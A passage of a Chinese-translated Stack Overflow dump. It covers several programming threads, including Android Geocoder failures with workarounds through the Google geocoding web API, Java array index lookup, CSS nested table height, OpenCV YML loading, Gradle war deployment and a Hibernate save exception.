                        //Log.e(MyGeocoder.class.getName(), result.toString());
                        Address addr = new Address(Locale.getDefault());
                        // addr.setAddressLine(0, result.getString("formatted_address"));

                        JSONArray components = result.getJSONArray("address_components");
                        String streetNumber = "";
                        String route = "";
                        for (int a = 0; a < components.length(); a++) {
                            JSONObject component = components.getJSONObject(a);
                            JSONArray types = component.getJSONArray("types");
                            for (int j = 0; j < types.length(); j++) {
                                String type = types.getString(j);
                                if (type.equals("locality")) {
                                    addr.setLocality(component.getString("long_name"));
                                } else if (type.equals("street_number")) {
                                    streetNumber = component.getString("long_name");
                                } else if (type.equals("route")) {
                                    route = component.getString("long_name");
                                }
                            }
                        }
                        addr.setAddressLine(0, route + " " + streetNumber);

                        addr.setLatitude(result.getJSONObject("geometry").getJSONObject("location").getDouble("lat"));
                        addr.setLongitude(result.getJSONObject("geometry").getJSONObject("location").getDouble("lng"));
                        retList.add(addr);
                    }
                }
            }

        } catch (ClientProtocolException e) {
            Log.e(MyGeocoder.class.getName(), "Error calling Google geocode webservice.", e);
        } catch (IOException e) {
            Log.e(MyGeocoder.class.getName(), "Error calling Google geocode webservice.", e);
        } catch (JSONException e) {
            Log.e(MyGeocoder.class.getName(), "Error parsing Google geocode webservice response.", e);
        }

        return retList;
    }
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-11T14:08:12.183

使用这个技巧。

只需编辑 project.properties

```
# Project target
target=Google Inc.:Google APIs:16 
```

原因是 Geocoder 类存在于核心 Android 框架中，但依赖于 Google API 贡献的代码才能正常运行。即使您的 AVD 包含 Google API，您的项目仍然需要针对该特定构建目标进行构建。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-03-15T15:45:10.597

服务不可用 - Geocoder Android 当我在一些煮熟的 rom 中收到此错误时，我编写了这个库，希望对我有用。[https://github.com/dnocode/gapis](https://github.com/dnocode/gapis)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2015-03-27T13:21:08.873

我正在使用与 Geocoder 代码“合并”的代码（直接访问 Google 地图），如下所示（特别注意“try catch”）：

```
...
//address is String
if (address != null) {
    new GeocoderTask().execute(address);
}
...

// An AsyncTask class for accessing the GeoCoding Web Service
private class GeocoderTask extends AsyncTask<String, Void, List<Address>> {

    private LatLng latLng;
    private MarkerOptions markerOptions;

    @Override
    protected List<Address> doInBackground(String... locationName) {
        // Creating an instance of Geocoder class
        Geocoder geocoder = new Geocoder(getBaseContext());
        List<Address> addresses = null;

        try {
            // Getting a maximum of 3 Address that matches the input text
            addresses = geocoder.getFromLocationName(locationName[0], 3);
        } catch (IOException e) {
            e.printStackTrace();
            try {
                addresses = getLocationFromString(locationName[0]);
            } catch (UnsupportedEncodingException e1) {
                e1.printStackTrace();
            } catch (JSONException e1) {
                e1.printStackTrace();
            }

        }
        return addresses;
    }

    @Override
    protected void onPostExecute(List<Address> addresses) {

        if (addresses == null || addresses.size() == 0) {
            Toast.makeText(getBaseContext(), "No Location found",
                    Toast.LENGTH_SHORT).show();
            return;
        }

        // Clears all the existing markers on the map
        googleMap.clear();

        // Adding Markers on Google Map for each matching address
        for (int i = 0; i < addresses.size(); i++) {

            Address address = (Address) addresses.get(i);

            // Creating an instance of GeoPoint, to display in Google Map
            latLng = new LatLng(address.getLatitude(),
                    address.getLongitude());

            String addressText = String.format(
                    "%s, %s",
                    address.getMaxAddressLineIndex() > 0 ? address
                            .getAddressLine(0) : "", address
                            .getCountryName());

            markerOptions = new MarkerOptions();
            markerOptions.position(latLng);
            markerOptions.title(addressText);

            googleMap.addMarker(markerOptions);

            // Locate the first location
            if (i == 0) {
                CameraUpdate center = CameraUpdateFactory.newLatLng(latLng);
                CameraUpdate zoom = CameraUpdateFactory.zoomTo(13);

                googleMap.moveCamera(center);
                googleMap.animateCamera(zoom);
            }

        }

    }
}

public static LatLng getLocationFromString(String address)
    throws JSONException {

    HttpGet httpGet = new HttpGet(
        "http://maps.google.com/maps/api/geocode/json?address="
                + URLEncoder.encode(address, "UTF-8") + "&ka&sensor=false");
    HttpClient client = new DefaultHttpClient();
    HttpResponse response;
    StringBuilder stringBuilder = new StringBuilder();

    try {
    response = client.execute(httpGet);
    HttpEntity entity = response.getEntity();
    InputStream stream = entity.getContent();
    int b;
    while ((b = stream.read()) != -1) {
        stringBuilder.append((char) b);
    }
    } catch (ClientProtocolException e) {
    } catch (IOException e) {
    }

    JSONObject jsonObject = new JSONObject(stringBuilder.toString());

    double lng = ((JSONArray) jsonObject.get("results")).getJSONObject(0)
        .getJSONObject("geometry").getJSONObject("location")
        .getDouble("lng");

    double lat = ((JSONArray) jsonObject.get("results")).getJSONObject(0)
        .getJSONObject("geometry").getJSONObject("location")
        .getDouble("lat");

    return new LatLng(lat, lng);
}

    public static List<Address> getStringFromLocation(double lat, double lng)
    throws ClientProtocolException, IOException, JSONException {

    String address = String
        .format(Locale.ENGLISH,                                 "http://maps.googleapis.com/maps/api/geocode/json?latlng=%1$f,%2$f&sensor=true&language="
                        + Locale.getDefault().getCountry(), lat, lng);
    HttpGet httpGet = new HttpGet(address);
    HttpClient client = new DefaultHttpClient();
    HttpResponse response;
    StringBuilder stringBuilder = new StringBuilder();

    List<Address> retList = null;

    response = client.execute(httpGet);
    HttpEntity entity = response.getEntity();
    InputStream stream = entity.getContent();
    int b;
    while ((b = stream.read()) != -1) {
    stringBuilder.append((char) b);
    }

    JSONObject jsonObject = new JSONObject(stringBuilder.toString());

    retList = new ArrayList<Address>();

    if ("OK".equalsIgnoreCase(jsonObject.getString("status"))) {
    JSONArray results = jsonObject.getJSONArray("results");
    for (int i = 0; i < results.length(); i++) {
        JSONObject result = results.getJSONObject(i);
        String indiStr = result.getString("formatted_address");
        Address addr = new Address(Locale.getDefault());
        addr.setAddressLine(0, indiStr);
        retList.add(addr);
    }
    }

    return retList;
} 
```

这对我来说非常有用，因为当地理编码器不工作时，我使用直接访问谷歌地图。

干杯!

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2020-05-29T03:38:00.193

您可以转到手机中的地图应用程序并清除缓存，然后会发现地址正常工作。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-07-18T12:34:31.600

我有相同的地理编码器错误，但未应用上述错误。它不会运行我的一台 Android 设备。然后我记得我已经意外地杀死了一些正在运行的服务。解决方案是取出电池几秒钟，然后重新安装。它在不更改代码的情况下工作:))

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-11-27T15:34:46.527

有些设备不支持地理编码器，因此您需要做的是创建自己的地理编码器。

基本上，您需要创建一个异步任务来向 google 请求地址并处理 json 响应。

使用查询，我做这样的事情：

```
public void asyncJson(String address){
        address = address.replace(" ", "+");

        String url = "http://maps.googleapis.com/maps/api/geocode/json?address="+ address +"&sensor=true";

        aq.ajax(url, JSONObject.class, new AjaxCallback<JSONObject>() {

                @Override
                public void callback(String url, JSONObject json, AjaxStatus status) {                        

                        if(json != null){

                                 //here you work with the response json
                                 JSONArray results = json.getJSONArray("results");                               
                                Toast.makeText(context, results.getJSONObject(1).getString("formatted_address"));

                        }else{                                
                                //ajax error, show error code
                                Toast.makeText(aq.getContext(), "Error:" + status.getCode(), Toast.LENGTH_LONG).show();
                        }
                }
        });        
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-03-01T10:53:33.580

对于以下行

```
Geocoder gCoder = new Geocoder(context, Locale.getDefault()); 
```

> 使用`Context`您的活动，不要使用`getApplicationContext()`

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-09-02T20:26:43.087

我也遇到了这个错误。它发生在我最近将设备更新为 Marshmallow 时。

如果我重新启动，它会工作一次，但随后会失败，此后根本无法工作。

我像其他人一样创建了一个 AsyncTask，它只返回 json 响应的第一个结果中的地址。

要使用下面的代码，请使用您的 api 键调用它，然后使用 Location 对象作为输入来执行 AsyncTask。您可以使用以下内容导入位置。`import android.location.Location;`您必须通过请求更新来使用 LocationManager 获取当前位置。

```
 new ReverseGeoCodeTask(GOOGLE_API_KEY).execute(location); 
```

确保将 api 密钥替换为您自己的密钥，并确保您在谷歌云控制台中启用它。这是您为特定项目管理所有 google api 的地方。

将此类复制为您需要反向地理编码地址的活动中的内部类。

```
/**
 * Reverse geocode request - takes a Location in as parameters,
 * and does a network request in the background to get the first address in
 * json response. The address is returned in the onPostExecute so you
 * can update the UI with it
 */

private class ReverseGeoCodeTask extends AsyncTask<Location, Void, String>{

    private final static String GEOCODE_API_ENDPOINT_BASE = "https://maps.googleapis.com/maps/api/geocode/json?latlng=";
    private final static String JSON_PROPERTY_RESULTS = "results";
    private final static String JSON_PROPERTY_FORMATTED_ADDRESS = "formatted_address";
    private final static String JSON_PROPERTY_REQUEST_STATUS = "status";
    private final static String STATUS_OK = "OK";
    private String apiKey;

    public ReverseGeoCodeTask(final String apiKey){
        this.apiKey = apiKey;
    }

    @Override
    protected String doInBackground(Location... params) {

        if(apiKey == null){
            throw new IllegalStateException("Pass in a geocode api key in the ReverseGeoCoder constructor");
        }

        Location location = params[0];
        String googleGeocodeEndpoint = GEOCODE_API_ENDPOINT_BASE + location.getLatitude() + "," + location.getLongitude() + "&key=" + apiKey;
        Log.d(TAG, "Requesting gecoding endpoint : " + googleGeocodeEndpoint);
            try {
                URL url = new URL(googleGeocodeEndpoint);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                StringBuilder result = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line);
                }

                JSONObject json = new JSONObject(result.toString());
                String requestStatus = json.getString(JSON_PROPERTY_REQUEST_STATUS);
                if(requestStatus.equals(STATUS_OK)){
                    JSONArray results = json.getJSONArray(JSON_PROPERTY_RESULTS);
                    if(results.length() > 0){
                        JSONObject result1 = results.getJSONObject(0);
                        String address =  result1.getString(JSON_PROPERTY_FORMATTED_ADDRESS);
                        Log.d(TAG, "First result's address : " + address );
                        return  address;

                    }
                    else{
                        Log.d(TAG, "There were no results.");
                    }
                }
                else{
                    Log.w(TAG, "Geocode request status not " + STATUS_OK + ", it was " + requestStatus );
                    Log.w(TAG, "Did you enable the geocode in the google cloud api console? Is it the right api key?");
                }

            }catch ( IOException | JSONException e){

                e.printStackTrace();
            }

        return null;
    }

    @Override
    protected void onPostExecute(String address) {
        super.onPostExecute(address);
        if(address != null){
            // update the UI here with the address, if its not null
            originEditText.setText(address);
        }
        else{
            Log.d(TAG, "Did not find an address, UI not being updated");
        }

    }
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2019-05-04T14:22:30.233

**在Android 6**上有同样的问题。问题出在**App 权限**中。即使地图正常工作，您也必须在应用权限中允许**“获取位置”权限。**

最好的情况是，当您希望在结果中获得该位置时，始终检查允许的此权限。

我使用这种方法从地方获取完整地址：

```
public Address getFullAddress(Place place){
    Address address;

    Locale aLocale = new Locale.Builder().setLanguage("en").build();
    Geocoder geocoder = new Geocoder(this, aLocale);

    try {
        List<Address> addresses = geocoder.getFromLocation(place.getLatLng().latitude,place.getLatLng().longitude, 1);

        address = addresses.get(0);

        return address;

    } catch (IOException e) {
        e.printStackTrace();
    }

    return null;
} 
```

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2014-08-19T08:43:32.653

我有同样的错误，添加以下权限来解决它。

```
<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" /> 
<uses-permission android:name="android.permission.INTERNET" /> 
```

* * *

## 回答 #16

> 赞同：-1
> 
> 时间：2018-03-23T12:20:26.547

```
new Volly_Services(map, "https://maps.googleapis.com/maps/api/place/textsearch/json?query=" + mBinding.loc.getText().toString().trim() + "&key=Ap", getActivity()).vollyPostService().continueWithTask(task - > {
    mBinding.progressBaar.setVisibility(View.GONE);

    if (task.getResult() != null) {

        Log.e("<<<", "" + task.getResult());

        JSONObject jsonObject = new JSONObject("" + task.getResult());
        if ("OK".equalsIgnoreCase(jsonObject.getString("status"))) {
            JSONArray results = jsonObject.getJSONArray("results");
            if (results.length() > 0) {
                mBinding.loc.setVisibility(View.GONE);
                for (int i = 0; i < results.length(); i++) {
                    JSONObject result = results.getJSONObject(i);
                    String indiStr = result.getString("formatted_address");
                    Address addr = new Address(Locale.getDefault());

                    addr.setAddressLine(0, indiStr);
                    addr.setLocality(result.getString("name"));
                    JSONObject geometry = result.getJSONObject("geometry").getJSONObject("location");
                    addr.setLatitude(geometry.getDouble("lat"));
                    addr.setLongitude(geometry.getDouble("lng"));

                    addresses.add(addr);
                }
                adapter = new SerchLocationAdapter(getActivity(), addresses);
                mBinding.serchreg.setAdapter(adapter);
            } else {
                Toast.makeText(getActivity(), "No result found", Toast.LENGTH_LONG).show();
            }

        } else {
            Toast.makeText(getActivity(), "No result found", Toast.LENGTH_LONG).show();
        }
    } else {
        Log.e("<<<<<<", "" + task.getError().getMessage());
        Toast.makeText(getActivity(), task.getError().getMessage(), Toast.LENGTH_LONG).show();
    }
    return null;
}); 
```

* * *

## 回答 #17

> 赞同：-1
> 
> 时间：2020-10-13T09:31:02.540

我使用 Volley，它工作正常

```
 private void callAppFromUrl(final String strAddress, final String app, final boolean isGeo) {
    try {
        Volley.newRequestQueue(this).add(new StringRequest(0, String.format("https://www.google.com/maps?q=%s", URLEncoder.encode(strAddress, "UTF-8")), new Response.Listener<String>() {
            public void onResponse(String response) {
                try {
                    try {
                        Matcher m = Pattern.compile("null,null,(\\d+.\\d+),(\\d+.\\d+)").matcher(response);
                        String strLatLong = "";
                        if (m.find()) {
                            strLatLong = m.group(0).replace("null,null,", "");
                        }
                        String[] latlong = strLatLong.split(",");
                        LatLng latLng = new LatLng(Double.parseDouble(latlong[0]), Double.parseDouble(latlong[1]));
                        Log.d("OsK",String.valueOf(latLng));
                    } catch (Exception e) {
                        Toast.makeText(getApplicationContext(), "Không tìm thấy địa chỉ&quot;, Toast.LENGTH_LONG).show();
                    }
                } catch (Exception e2) {
                    Toast.makeText(getApplicationContext(), "Không tìm thấy địa chỉ&quot;, Toast.LENGTH_LONG).show();
                }
            }
        }, new Response.ErrorListener() {
            /* class com.cantho.roadtech.MainActivity.AnonymousClass5 */

            @Override // com.android.volley.Response.ErrorListener
            public void onErrorResponse(VolleyError error) {

            }
        }) {
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("User-Agent", "Mozilla");
                params.put("Accept-Language", "en-US,en;q=0.8");
                params.put("Referer", "google.com");
                return params;
            }
        });
    } catch (Exception ex) {
    }
} 
```

# php - 在 joomla2.5 中使用 Chronoform 时在电子邮件中发送产品名称

> ID：15110529
> 
> 赞同：1
> 
> 时间：2013-02-27T11:08:05.833
> 
> 标签：php, joomla2.5, chronoforms

我有一个使用`Chronoforms`组件创建的联系表单，它使用`Chronoforms`插件显示。

实际上我有不同的页面，每个页面都有一个共同的按钮名称免费试用。
单击免费试用，它将在新的弹出窗口中打开该表单。
在该表单中，我使用`Chronoforms`表单向导创建了一些公共字段，因此邮件与这些字段值一起发送。
但是现在我希望邮件需要一个名为“产品”的额外价值标签，并且它的价值将是动态的，关于我从哪个页面单击哪个免费试用按钮，也许当我从每个页面单击免费试用时它会创建一个链接，例如`http://domainname.com/index.php/free-trial/?product=dynamiccontent`.

有什么建议我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-28T22:17:55.650

在表单的管理面板（表单向导）中，您可以尝试这种方式。在“提交时”区域的“事件”选项卡上添加“自定义代码” `<?php $form->data['product'] = $someProduct; ?>`，如果产品名称将在链接中，则可以从 $_REQUEST 获得 $someProduct。之后，您可以在字母中使用 {product}（例如，'Custom code' 应该在 ''Email 之前）。

# cgal - 从cgal中提取代码

> ID：15110532
> 
> 赞同：1
> 
> 时间：2013-02-27T11:08:14.487
> 
> 标签：cgal

我想在我的项目中使用 CGAL 的半边数据结构。

由于它是由 LGPL 授权的，我更愿意将这个小块与我的软件一起分发，而不是要求在用户的系统上安装这个大库。

所以我的问题是，Cgal 是否有类似 boost 的 bcp 的东西？我开始手动复制半边源文件，但它看起来相当复杂。

先感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T16:28:22.067

目前没有自动方法来提取 CGAL 标头的子集或仅提取包含其依赖项的包。您可以尝试手动执行此操作，只需遵循所有包含依赖项即可。

即使你这样做，最大的问题是 CGAL 断言需要链接到`libCGAL`. 您可以通过`CGAL_NDEBUG`宏禁用断言来避免这种情况。从 CGAL 发行版中也不容易看出一个包是否将代码编译为`libCGAL`.，但既不这样做`Polyhedron`也不`Halfedge_DS`这样做，所以你应该没问题。

# java - 如何返回对象数组的索引？

> ID：15110534
> 
> 赞同：1
> 
> 时间：2013-02-27T11:08:17.737
> 
> 标签：java

尝试返回索引时出现错误（必须返回一个 int），我看不出我做错了什么。如何将 Object 数组索引与 int 进行比较，并返回索引号？

```
//x starts at 10000 because the left most number is assumed to be at least a 1.
/**
 * Search for a book id within the Book object array
 * @param Book - Array of objects with book id, title, isbn, author, and category
 * @param numOfBooks - how many books are in the library
 * @param myBookID - The key to search for
 * @return the index of the array where the key matches
 */
public static int bookSearch (Object[] Book, int numOfBooks, int myBookID) {
    for (int x = 10000; x <= numOfBooks; x ++)
        if (Book[x].equals(myBookID))
            return x;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:10:07.487

您需要在最后添加一个额外的 return，因为您的 if 条件可能永远不会匹配。

```
public static int bookSearch (Object[] Book, int numOfBooks, int myBookID) {
    for (int x = 10000; x <= numOfBooks; x ++) {
        if (Book[x].equals(myBookID))
            return x;
    }

    return -1;
} 
```

附带说明一下，您可能想要检查数组的边界，而不是假设其中最多有 10000 个项目。您还可以利用所有数组都有一个`length`属性这一事实，以避免传入您的参数之一：

```
public static int bookSearch (Object[] books, int myBookID) {
    if(books.length < 100000) return -1;

    for (int x = 10000; x <= books.length; x++) {
        if (Book[x].equals(myBookID))
            return x;
    }

    return -1;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:11:35.543

您可能正在寻找类似的东西：

```
public static int bookSearch (Book[] books, int myBookID) {
    for (int x = 0; x < books.length; x++)
        if (books[x].getId() == myBookID)
            return x;
    return -1; // not found
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-10-28T04:39:43.297

它只在javascript中工作，

您可以轻松找到索引号。通过对象中的任何属性从对象数组列表中

```
function _findIndexByKeyValue(arraytosearch, key, valuetosearch) {
    for (var i = 0; i < arraytosearch.length; i++) {
        if (arraytosearch[i][key] == valuetosearch) {
            return i;
        }
    }
    return -1;
} 
```

像这样应用上述方法

```
var index = _findIndexByKeyValue(objectArrayList, "id", objectArrayList.id); // pass by value
if (index > -1) {
    // your code 
} 
```

数组列表

```
var objectArrayList = [{
    property1: 10,
    property2: 11,
    timestamp: "date-001",
    id: 1
}, {
    property1: 10,
    property2: 11,
    timestamp: "date-002",
    id: 2
}, {
    property1: 10,
    property2: 14,
    timestamp: "date-002",
    id: 3
}, {
    property1: 17,
    property2: 11,
    timestamp: "date-003",
    id: 4
}]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:10:09.057

循环外应该有一个return语句，这样即使在不满足条件的情况下退出循环，函数也会返回一个int。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T11:10:34.053

您需要在循环外返回一个值，以防等号永远不匹配。另一种解决方案是如果找不到则抛出异常。

如果没有实际返回值（或抛出异常），则无法到达返回类型不是 void 的函数的末尾。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-27T11:11:29.783

这是因为编译器比你看得更远，它还考虑了你的书不在数组中的情况。**那**你还什么？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-02-27T11:11:29.923

您必须在循环下添加第二个返回，以防等号永远不匹配。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-02-27T11:13:18.483

问题是，如果在 if 中评估的表达式始终为 false，则可能永远无法达到 if 语句中的 return。

只需在 for 循环之外添加一个“默认”返回！

# html - 表格高度 100% 未设置为父高度

> ID：15110539
> 
> 赞同：2
> 
> 时间：2013-02-27T11:08:37.730
> 
> 标签：html, css

我在表格单元格中有一个表格。子表高度必须与父单元格高度对齐。我设置`height="100%"`到子表，但它不工作。

CSS

```
.outer{
  border:1px solid black;
  border-collapse:collapse;
}
.inner{
  border:1px solid red;
  height:100%;
  width:auto;
} 
```

HTML

```
<table class="outer">
  <tr>
    <td>
      <!-- Content Here -->
    </td>
    <td>
      <table class="inner">
        <tr>
          <td>
            <!-- Content Here -->
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-10T06:29:26.140

浏览器不计算表格单元格的高度。至少没有好的跨浏览器 CSS 解决方案。父 TD 的相对和绝对定位会导致表格塌陷。解决方案可能是以像素为单位设置固定高度或使用 JavaScript 计算 offsetHeight。设置样式=“高度：100%；” 到父 TD 和 id="inner" 到子表。在页面加载时运行以下 JavaScript：

```
<!DOCTYPE HTML PUBLIC>
<html>
 <head>
 <style>
  .outer{
   border:1px solid black;
   border-collapse:collapse;
  }
  .inner{
    border:1px solid red;
    height:100%;
    width:auto;
  }
 </style>

 </head>
 <body>

  <table class="outer">
   <tr>
    <td> asdf alsdf asldf<br/>asdf alsdf asldf<br/> asdf alsdf asldf<br/>
         asdf alsdf asldf<br/>asdf alsdf asldf<br/>
    </td>
    <td style="height:100%;">
     <table class="inner" id="inner">
       <tr><td>inner content</td></tr>
     </table>
    </td>
   </tr>
  </table>
  <script type="text/javascript">
    var el = document.getElementById('inner');
    el.style.height = el.parentNode.offsetHeight + 'px';
  </script>
 </body>
</html> 
```

如果需要，您还可以将其绑定到窗口 onresize 事件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-19T17:42:10.443

我的解决方案是给内表一个固定的高度 1px 并将内表中 td 的高度设置为 100%。无论如何，它运行良好，在 IE、Chrome 和 FF 中进行了测试！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:23:40.750

使用**内**表为父**td**分配一些宽度。说。还添加以下 CSS：**`width="100"`**

 **对于**外部** 类添加`position : relative;`

对于**内部**类添加`position:absolute; bottom:0; right:0; top:0;`

还将 display: block 属性添加到**内部**类**

# c++ - 在 Opencv 中加载 YML 文件 - 优化

> ID：15110542
> 
> 赞同：0
> 
> 时间：2013-02-27T11:08:50.317
> 
> 标签：c++, c, optimization, opencv

我正在加载一个具有“160470 * 199”点的 yml 文件。在我的机器上花了一分钟多的时间。我怎样才能使它快速？

我使用下面的代码来加载一个 yml 文件。

```
 Mat sd;
 string Fsd  = "//home//Desktop//YML//sd.yml";
 FileStorage fsDemo1( Fsd, FileStorage::READ);
 fsDemo1["sd"] >> sd; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:20:03.897

您可以假设在`FileStorage`OpenCV 类中读取的文件已针对性能进行了充分调整。

你更应该担心的是，你真的需要`FileStorage`. 使用这种方法的缺点是会在您的大文件上运行完整的语法`YAML`/解析器。`XML`在我看来，这将比实际从磁盘读取文件所需的时间慢得多。

我的建议是，如果您真的希望从磁盘快速读取并立即使用（无需解析），我建议您将数据存储在二进制文件中。使用此类文件的优点是，您只需花时间读取文件，您不必解析这些文件。您可以立即从中读取 C`struct`或 C++ `class`。

然而，不利的一面是，如果您确实将数据写入二进制文件，那么当您迁移到另一台机器（不同的架构）时，您可能会遇到一些非常恼人的错误，尤其是在字节序或可变长度`int`类型的情况下。但在我看来，这种情况很少见，因为大多数人无论如何都使用英特尔或英特尔兼容的处理器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-11-04T14:19:00.340

以Release模式运行程序，程序运行速度提高5倍。

# java - 在 Java 中检索 GAE Datastore 的数据类型

> ID：15110543
> 
> 赞同：0
> 
> 时间：2013-02-27T11:08:51.777
> 
> 标签：java, google-app-engine

如何使用 Java 检索存储在 Google App Engine Datastore 中的实体属性的数据类型？我在 Java Datastore API 中没有找到 property.getType() 或类似方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:34:55.273

没有提供直接的方法。

但是您可以通过将 java 属性类型与此[链接中给出的表进行比较来检索它](https://developers.google.com/appengine/docs/java/datastore/entities#Properties_and_Value_Types)

```
Map<String, Object> properties = entity.getProperties();
    String[] propertyNames = properties.keySet().toArray(
        new String[properties.size()]);

    for(final String propertyName : propertyNames) {
      // propertyNames string contains
      // "com.google.appengine.api.users.User" then its Google Accounts user
      // "java.lang.Integer" then its Integer
      // "int" then premetive integer
    } 
```

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:12:42.077

您需要使用[属性元数据查询](https://developers.google.com/appengine/docs/java/datastore/metadataqueries#Property_Queries_Non_Keys_Only_Property_Representation)。

请注意，如文档中所述，查询返回的属性表示将是 AppEngine 表示，并且与 Java 类没有一对一的映射。但是你至少可以得到一般的数据类型。

# gradle - 如何运行一个 gradle web 应用程序？

> ID：15110545
> 
> 赞同：7
> 
> 时间：2013-02-27T11:08:58.070
> 
> 标签：gradle, spring-tool-suite

我已经将一个 maven 项目转换为 gradle ，我正在使用 Spring 工具套件，并且所有依赖项 jar 都已成功上传。当我构建项目时，它会成功构建。但我不知道如何运行这个 Web 应用程序，我试图进行一场战争，以便我可以使用 tomcat 进行部署，我找到了 tomcat 插件但是当我在我的 build.gradle 文件中插入 tomcat 插件时，它给出了我的错误： **找不到带有 tomcat id 的插件**

请帮助我刚刚被卡住的人，我假设它遵循的结构与 gradle 相同，并且由于我使用的是 jsp 页面和 xml 文件，我可以将这些文件保存在我的资源文件夹中。

**如何创建项目的war文件并在tomcat中使用eclipse-wtp进行部署？**

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-27T14:33:58.717

要创建战争，只需使用：`apply plugin: 'war'`

对于 WTP，将这些行添加到您的 build.gradle：

```
apply plugin: 'eclipse'
apply plugin: 'eclipse-wtp' 
```

要在构建中使用 tomcat 部署 war 文件，您可以使用[cargo 插件](https://github.com/bmuschko/gradle-cargo-plugin)。这样，您可以在部署后开始，例如集成测试等。

要在eclipse tomcat 中部署war 文件：您必须先将`gradle eclipse`上述`apply plugin: ...`内容放入您的build.gradle 之后运行。然后在 eclipse 中刷新并将 web 项目添加到您的 tomcat 中。

# java - 保存对象列表引发休眠异常

> ID：15110549
> 
> 赞同：0
> 
> 时间：2013-02-27T11:09:09.460
> 
> 标签：java, hibernate

当我`List`通过调用保存对象时`saveListOfPageChooserElement`，它会引发以下异常

然而，当我通过调用保存单个实例时`saveOrUpdate`，它可以正常工作。

但是为了提高性能，我想一次保存一个列表批次而不是单个对象。

谁能建议一次保存整个列表有什么问题？

```
 List<Abc> listabc = widgetCopyDAO
                    .fetchabcByPageId(id);

    for (Abc abc: listabc ) {
                abc.setLastUpdatedBy(null);
                abc.setLastUpdatedOn(null);
                abc.setCreatedBy(widgetCopyDTO.getUserName());
                abc.setCreatedOn(new Date());
                abc.setPageChooser(new PageChooser(chooser.getId()));

                abc.setId(0l);
                issuePageWidgetDAO.saveOrUpdate(abc);
            }
//  widgetCopyDAO.saveListOfPageChooserElement(listabc);

public void saveOrUpdate(Abc abc) {
        if (abc.getId() == 0) {
            Long id = (Long) this.getHibernateTemplate().save(
                    abc);
            abc.setId(id);
        } else {
            this.getHibernateTemplate().update(abc);
        }
    }

public void saveListOfPageChooserElement(
            List<Abc> listabc) {
        this.getHibernateTemplate().saveOrUpdateAll(listabc);

    } 
```

例外是

```
org.springframework.orm.hibernate3.HibernateSystemException: identifier of an instance of com.mct.model.Abc was altered from 138 to 0; nested exception is org.hibernate.HibernateException: identifier of an instance of com.mct.model.Abc was altered from 138 to 0
    at org.springframework.orm.hibernate3.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:676)
    at org.springframework.orm.hibernate3.HibernateAccessor.convertHibernateAccessException(HibernateAccessor.java:412)
    at org.springframework.orm.hibernate3.HibernateTemplate.doExecute(HibernateTemplate.java:424)
    at org.springframework.orm.hibernate3.HibernateTemplate.executeWithNativeSession(HibernateTemplate.java:374)
    at org.springframework.orm.hibernate3.HibernateTemplate.findByCriteria(HibernateTemplate.java:1055)
    at org.springframework.orm.hibernate3.HibernateTemplate.findByCriteria(HibernateTemplate.java:1048)
    at com.mct.dao.WidgetCopyDAO.fetchPageChooserWithImagesByChooser(WidgetCopyDAO.java:82)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:307)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:182)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:149)
    at org.springframework.aop.framework.adapter.ThrowsAdviceInterceptor.invoke(ThrowsAdviceInterceptor.java:126)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
    at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:50)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
    at org.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor.invoke(MethodBeforeAdviceInterceptor.java:50)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171)
